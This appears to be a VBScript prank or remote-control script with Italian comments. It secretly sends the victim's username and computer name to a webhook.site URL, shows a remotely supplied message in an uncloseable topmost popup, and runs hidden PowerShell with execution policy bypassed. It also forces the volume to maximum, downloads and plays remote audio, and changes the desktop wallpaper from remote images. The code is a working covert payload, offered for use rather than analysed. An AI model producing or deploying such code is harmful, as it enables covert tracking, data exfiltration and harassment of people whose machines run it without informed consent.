Option Explicit 
On Error Resume Next 

' --- CONFIGURAZIONE --- 
Dim shell, fso, xmlHttp, i 
Dim urlImmagine1, urlImmagine2, urlImmagine3, urlAudio1, urlAudio2, urlAudio3 
Dim urlMessaggio, webhookURL 
Dim messaggioDalWeb, nomeUtente, nomePC 
Dim scelta1, scelta2, scelta3, sceltaEffettuata 
Dim msgSafe, s1Safe, s2Safe, s3Safe 

scelta1 = "Non vedo l'ora!" 
scelta2 = "" 
scelta3 = "" 

' Generiamo un timestamp univoco per bypassare la cache
Dim ts: ts = Timer()
urlImmagine1 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/immagine1.jpg?v=" & ts
urlImmagine2 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/immagine2.jpg?v=" & ts
urlImmagine3 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/immagine3.jpg?v=" & ts
urlAudio1 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/audio1.mp3" 
urlAudio2 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/audio2.mp3" 
urlAudio3 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/audio3.mp3" 
urlMessaggio = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/messaggio.txt?v=" & ts
webhookURL = "https://webhook.site/548ae85b-8bc6-42de-a64c-4ffabb6a44d2" 

Set shell = CreateObject("WScript.Shell") 
Set fso = CreateObject("Scripting.FileSystemObject") 

nomeUtente = shell.ExpandEnvironmentStrings("%USERNAME%") 
nomePC = shell.ExpandEnvironmentStrings("%COMPUTERNAME%") 

' --- NOTIFICA AVVIO ---
InviaNotificaRemoteWebhook webhookURL, nomeUtente, nomePC, "AVVIO SCRIPT", "Connesso"

' --- DOWNLOAD MESSAGGIO --- 
Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0") 
xmlHttp.Open "GET", urlMessaggio, False 
xmlHttp.Send 
If xmlHttp.Status = 200 Then 
    messaggioDalWeb = Trim(xmlHttp.responseText)
End If 



' --- PREPARAZIONE POPUP ---
msgSafe = Replace(messaggioDalWeb, "'", "''")
s1Safe = Replace(scelta1, "'", "''")
s2Safe = Replace(scelta2, "'", "''")
s3Safe = Replace(scelta3, "'", "''")

' --- POPUP --- 
If messaggioDalWeb <> "" Then 
    Dim psPopup, tempFile, fileOut
    tempFile = shell.ExpandEnvironmentStrings("%TEMP%") & "\scelta_" & Replace(CStr(Timer), ",", "") & ".txt"

    ' QUI LA MODIFICA: ControlBox = $false (niente X) ma Size = 420,260 (pi√π alto per vedere i tasti)
    psPopup = "Add-Type -AssemblyName System.Windows.Forms; " & _ 
              "$f = New-Object Windows.Forms.Form; $f.Text = 'GEA'; $f.Size = '420,260'; " & _ 
              "$f.StartPosition = 'CenterScreen'; $f.FormBorderStyle = 'FixedDialog'; $f.ControlBox = $false; $f.TopMost = $true; " & _ 
              "$l = New-Object Windows.Forms.Label; $l.Text = '" & msgSafe & "'; $l.TextAlign = 'MiddleCenter'; " & _ 
              "$l.Dock = 'Top'; $l.Height = 150; $l.Font = New-Object Drawing.Font('Segoe UI', 12); $f.Controls.Add($l); " & _ 
              "$p = New-Object Windows.Forms.FlowLayoutPanel; $p.Dock = 'Bottom'; $p.Height = 70; " & _ 
              "$p.FlowDirection = 'LeftToRight'; $p.WrapContents = $false; $p.Alignment = 'Center'; " & _
              "$p.Padding = New-Object Windows.Forms.Padding(10, 10, 0, 0); "
       
    If scelta1 <> "" Then psPopup = psPopup & "$b1 = New-Object Windows.Forms.Button; $b1.Text = '" & s1Safe & "'; $b1.AutoSize = $true; $b1.Height=40; $b1.Add_Click({$global:res='" & s1Safe & "';$f.Close()}); $p.Controls.Add($b1); " 
    If scelta2 <> "" Then psPopup = psPopup & "$b2 = New-Object Windows.Forms.Button; $b2.Text = '" & s2Safe & "'; $b2.AutoSize = $true; $b2.Height=40; $b2.Add_Click({$global:res='" & s2Safe & "';$f.Close()}); $p.Controls.Add($b2); " 
    If scelta3 <> "" Then psPopup = psPopup & "$b3 = New-Object Windows.Forms.Button; $b3.Text = '" & s3Safe & "'; $b3.AutoSize = $true; $b3.Height=40; $b3.Add_Click({$global:res='" & s3Safe & "';$f.Close()}); $p.Controls.Add($b3); " 
       
    ' Centratura automatica
    psPopup = psPopup & "$f.Add_Shown({ " & _ 
              "$totalWidth = 0; foreach($ctrl in $p.Controls) { $totalWidth += $ctrl.Width + $ctrl.Margin.Left + $ctrl.Margin.Right }; " & _ 
              "$leftPadding = ($p.Width - $totalWidth) / 2; if($leftPadding -gt 0) { $p.Padding = New-Object Windows.Forms.Padding($leftPadding, 15, 0, 0) } " & _ 
              "}); " 
              
    psPopup = psPopup & "$f.Controls.Add($p); $f.ShowDialog() | Out-Null; $global:res | Out-File -FilePath '" & tempFile & "' -Encoding ASCII"
       
    shell.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & Chr(34) & psPopup & Chr(34), 0, True 
    
    If fso.FileExists(tempFile) Then
        Set fileOut = fso.OpenTextFile(tempFile, 1)
        If Not fileOut.AtEndOfStream Then
            sceltaEffettuata = Trim(Replace(Replace(fileOut.ReadAll(), vbCrLf, ""), vbCr, ""))
        End If
        fileOut.Close
        fso.DeleteFile(tempFile)
    End If
End If 

' --- LOGICA AZIONI --- 
Select Case sceltaEffettuata 
    Case scelta1: RiproduciAudio urlAudio1: CambiaFondoDesktop urlImmagine1
    Case scelta2: RiproduciAudio urlAudio2: CambiaFondoDesktop urlImmagine2
    Case scelta3: RiproduciAudio urlAudio3: CambiaFondoDesktop urlImmagine3 
End Select 

' --- NOTIFICA FINALE --- 
Dim msgFinal, sceltaFinal
msgFinal = Replace(messaggioDalWeb, "'", "''")
sceltaFinal = Replace(sceltaEffettuata, "'", "''")
InviaNotificaRemoteWebhook webhookURL, nomeUtente, nomePC, msgFinal, sceltaFinal

' --- FUNZIONI ---

Sub RiproduciAudio(urlAudio) 

	' --- VOLUME --- 
shell.SendKeys Chr(&hAD)  
For i = 1 To 50: shell.SendKeys Chr(&hAF): Next 


    Dim p: p = shell.ExpandEnvironmentStrings("%TEMP%") & "\a.mp3" 
    shell.Run "powershell -Command ""(New-Object Net.WebClient).DownloadFile('" & urlAudio & "', '" & p & "')""", 0, True 

    If fso.FileExists(p) Then 
        Dim psCmd: psCmd = "powershell -WindowStyle Hidden -Command ""Add-Type -AssemblyName PresentationCore; " & _
                "$m = New-Object System.Windows.Media.MediaPlayer; " & _
                "$m.Open('" & p & "'); $m.Play(); Start-Sleep -Seconds 300""" 
        shell.Run psCmd, 0, False 
    End If 
End Sub

Sub CambiaFondoDesktop(urlImmagine) 
    Dim psScript
    psScript = "$url = '" & urlImmagine & "&nocache=' + (Get-Date).Ticks; " & _
               "$fileName = 'wallpaper_' + (Get-Random) + '.jpg'; " & _
               "$imgPath = Join-Path $env:TEMP $fileName; " & _
               "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
               "(New-Object Net.WebClient).DownloadFile($url, $imgPath); " & _
               "if (Test-Path $imgPath) { " & _
               "  Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $imgPath; " & _
               "  Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class W { [DllImport(\""user32.dll\"", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int a, int b, string c, int d); }'; " & _
               "  [W]::SystemParametersInfo(20, 0, $imgPath, 3); " & _
               "}"

    shell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """", 0, True 
End Sub 

Sub InviaNotificaRemoteWebhook(url, utente, pc, messaggio, scelta) 
    Dim sUtente, sPc, sMsg, sScelta
    sUtente = Replace(utente, "'", "''")
    sPc = Replace(pc, "'", "''")
    sMsg = Replace(messaggio, "'", "''")
    sScelta = Replace(scelta, "'", "''")

    Dim psCode
    psCode = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
             "$body = @{ utente='" & sUtente & "'; pc='" & sPc & "'; scelta='" & sScelta & "'; testo='" & sMsg & "' }; " & _
             "$json = $body | ConvertTo-Json -Compress; " & _
             "Invoke-RestMethod -Uri '" & url & "' -Method Post -Body $json -ContentType 'application/json'"

    shell.Run "powershell -WindowStyle Hidden -Command """ & psCode & """", 0, True 
End Sub
